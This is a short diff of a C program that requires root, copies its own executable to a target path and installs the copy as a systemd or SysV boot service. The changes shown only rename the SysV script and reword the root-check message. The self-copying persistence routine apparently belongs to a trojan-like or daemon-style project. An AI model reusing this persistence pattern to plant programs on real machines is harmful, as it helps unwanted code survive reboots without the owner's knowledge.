@@ -18,14 +18,14 @@ void	daemonize(char *target)
 	}
 	else // not systemd
 	{
-		fd = open(SYSV_CONF_DIR"/"PRG_NAME".service", O_CREAT | O_TRUNC | O_WRONLY, 0755);
+		fd = open(SYSV_CONF_DIR"/"PRG_NAME, O_CREAT | O_TRUNC | O_WRONLY, 0755);
 		if (fd >= 0)
 		{
 			len = sprintf(config, SYSV_CONFIG, PRG_NAME, DESCRIPTION, target, PRG_NAME, PRG_NAME);
 			write(fd, config, len);
 			close(fd);
-			system(SYSV_CONF_DIR"/"PRG_NAME".service stop");
-			system(SYSV_CONF_DIR"/"PRG_NAME".service start");
+			system(SYSV_CONF_DIR"/"PRG_NAME" stop");
+			system(SYSV_CONF_DIR"/"PRG_NAME" start");
 		}
 	}
 }
@@ -39,8 +39,8 @@ void	duplicate(char *path, char *target)
 		return ;
 	if (!access(SYSTEMD_CONF_DIR"/"PRG_NAME".service", F_OK))
 		system("systemctl stop "PRG_NAME);
-	else if (!access(SYSV_CONF_DIR"/"PRG_NAME".service", F_OK))
-		system(SYSV_CONF_DIR"/"PRG_NAME".service stop");
+	else if (!access(SYSV_CONF_DIR"/"PRG_NAME, F_OK))
+		system(SYSV_CONF_DIR"/"PRG_NAME" stop");
 	int target_fd = open(target, O_CREAT | O_TRUNC | O_WRONLY, 0100);
 	if (target_fd < 0)
 	{
@@ -70,7 +70,7 @@ int		main(void)
 
 	if (geteuid())
 	{
-		printf("You must be root !\n");
+		printf("Please run as root\n");
 		return (EXIT_FAILURE);
 	}
 	if (readlink(PROC_SELF_EXE, path, MAX_PATH_SIZE) < 0)
